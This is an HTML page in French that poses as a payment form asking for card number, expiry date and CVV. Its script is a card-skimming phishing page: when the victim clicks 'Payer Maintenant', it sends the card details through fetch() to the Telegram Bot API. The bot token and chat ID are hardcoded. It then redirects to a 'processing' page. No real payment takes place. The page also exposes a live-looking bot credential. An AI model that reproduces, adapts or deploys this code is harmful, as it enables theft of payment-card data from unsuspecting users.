<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Page de Paiement</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f9f9f9;
        }

        .container {
            max-width: 600px;
            margin: 50px auto;
            background: white;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
        }

        h2 {
            text-align: center;
            color: #333;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .form-group label {
            display: block;
            font-weight: bold;
            margin-bottom: 5px;
        }

        .form-group input, 
        .form-group select, 
        .form-group button {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }

        .form-group button {
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }

        .form-group button:hover {
            background-color: #45a049;
        }

        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.8);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 9999;
        }

        .spinner {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="container">
    <h2>Formulaire de Paiement</h2>
    <form id="payment-form">
        <div class="form-group">
            <label for="card-number">Num√©ro de Carte</label>
            <input type="text" id="card-number" name="card-number" placeholder="1234 5678 9012 3456" required>
        </div>
        <div class="form-group">
            <label for="expiry-month">Mois d'Expiration</label>
            <select id="expiry-month" name="expiry-month" required>
                <option value="01">01</option>
                <option value="02">02</option>
                <option value="03">03</option>
                <option value="04">04</option>
                <option value="05">05</option>
                <option value="06">06</option>
                <option value="07">07</option>
                <option value="08">08</option>
                <option value="09">09</option>
                <option value="10">10</option>
                <option value="11">11</option>
                <option value="12">12</option>
            </select>
        </div>
        <div class="form-group">
            <label for="expiry-year">Ann√©e d'Expiration</label>
            <select id="expiry-year" name="expiry-year" required>
                <option value="2025">2025</option>
                <option value="2026">2026</option>
                <option value="2027">2027</option>
                <option value="2028">2028</option>
            </select>
        </div>
        <div class="form-group">
            <label for="cvv">CVV</label>
            <input type="text" id="cvv" name="cvv" placeholder="123" required>
        </div>
        <div class="form-group">
            <button type="button" id="pay-button">Payer Maintenant</button>
        </div>
    </form>
</div>

<div class="loading-overlay" id="loading-overlay">
    <div class="spinner"></div>
</div>

<script>
    document.getElementById('pay-button').addEventListener('click', async function () {
        const loadingOverlay = document.getElementById('loading-overlay');
        loadingOverlay.style.display = 'flex';

        const form = document.getElementById('payment-form');
        const formData = new FormData(form);

        const cardNumber = formData.get('card-number');
        const expiryMonth = formData.get('expiry-month');
        const expiryYear = formData.get('expiry-year');
        const cvv = formData.get('cvv');

        const message = `
üí≥ Num√©ro de Carte: ${cardNumber}
üìÖ Expiration: ${expiryMonth}/${expiryYear}
üîí CVV: ${cvv}
        `;

        const botToken = '8101158488:AAH6WIfCC6B6aGkWd_Tt6QRrWD8QKQQc69M';
        const chatId = '5372119436';

        try {
            const response = await fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            });

            const result = await response.json();

            if (result.ok) {
                console.log('Message envoy√© √† Telegram.');
            } else {
                console.error('Erreur lors de l\'envoi √† Telegram.');
            }
        } catch (error) {
            console.error('Erreur r√©seau :', error);
        }

        setTimeout(() => {
            loadingOverlay.style.display = 'none';
            window.location.href = 'Traitement.html';
        }, 5000);
    });
</script>

</body>
</html>
